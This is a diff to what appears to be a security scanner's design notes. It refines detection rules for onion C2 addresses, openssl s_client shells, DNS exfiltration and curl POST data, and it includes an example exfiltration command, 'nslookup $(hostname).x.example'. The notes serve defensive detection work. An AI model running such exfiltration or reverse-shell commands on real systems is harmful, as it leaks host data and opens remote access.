@@ -220,6 +220,15 @@ and gated via `config.EcosystemConfig.Enabled`.
      (or `doas -s`); `pkexec apt-get install` and `sh -c "..."` are helper elevation. `G-FIND-EXEC`
      needs `-exec sh -p`/`-i` or a bare shell, or `sh -c` whose script fetches or decodes; loops
      that rename, link or strip files are build steps.
+   - **A channel rule needs an endpoint.** `P-ONION-C2` (`onion.go`) needs a real hidden-service
+     name: 16 base32 characters (v2) or 56 ending in `d` (v3), not an alphabet-run placeholder and
+     not a public operator's service (DuckDuckGo, Ahmia, the Tor Project, Facebook, mempool.space,
+     Cloudflare); a bare `.onion:`/`.onion/` suffix is a validator. `P-OPENSSL-CLIENT` needs
+     s_client wired to a shell on the line (certificate fetches and ProxyCommand tunnels are not).
+     `P-DNS-EXFIL` needs a command substitution or `$var` as the first label of the looked-up
+     name (`nslookup $(hostname).x.example`), never a JS template literal. `P-CURL-POST-DATA` needs a
+     shell or PHP variable (not a `${js.expr}`), and a printed hint or a POST whose every host is
+     loopback is suppressed.
 6. **goodkeys first.** Actor-key enrichment must call `goodkeys` before any
    DB/registry/GitHub lookup — a web-merged commit is signed by GitHub, not the
    attacker.
